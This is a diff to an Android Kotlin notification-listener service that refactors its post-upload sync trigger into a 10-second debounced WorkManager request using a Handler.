@@ -20,6 +20,8 @@ class DataSyncNotificationListenerService : NotificationListenerService() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private lateinit var deviceId: String
+    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
+    private var syncRunnable: Runnable? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -81,22 +83,28 @@ class DataSyncNotificationListenerService : NotificationListenerService() {
                 android.util.Log.d("NotificationService", "NOTIFICATION_UPLOAD_SUCCESS")
 
                 // Trigger automatic sync for other data types if a notification is received
-                // to keep the dashboard fresh.
-                val workManager = androidx.work.WorkManager.getInstance(this@DataSyncNotificationListenerService)
-                val syncRequest = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
-                    .setInitialDelay(5, java.util.concurrent.TimeUnit.SECONDS)
-                    .addTag("IncrementalSync")
-                    .build()
-
-                workManager.enqueueUniqueWork(
-                    "IncrementalSync",
-                    androidx.work.ExistingWorkPolicy.REPLACE,
-                    syncRequest
-                )
-                android.util.Log.d("NotificationService", "AUTO_SYNC_TRIGGERED")
+                triggerDebouncedSync()
             } catch (e: Exception) {
                 android.util.Log.e("NotificationService", "Error uploading notification", e)
             }
         }
+    }
+
+    private fun triggerDebouncedSync() {
+        syncRunnable?.let { handler.removeCallbacks(it) }
+        syncRunnable = Runnable {
+            android.util.Log.d("NotificationService", "AUTO_SYNC_TRIGGERED")
+            val workManager = androidx.work.WorkManager.getInstance(this@DataSyncNotificationListenerService)
+            val syncRequest = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
+                .addTag("IncrementalSync")
+                .build()
+
+            workManager.enqueueUniqueWork(
+                "IncrementalSync",
+                androidx.work.ExistingWorkPolicy.REPLACE,
+                syncRequest
+            )
+        }
+        handler.postDelayed(syncRunnable!!, 10000) // 10 seconds debounce
     }
 }
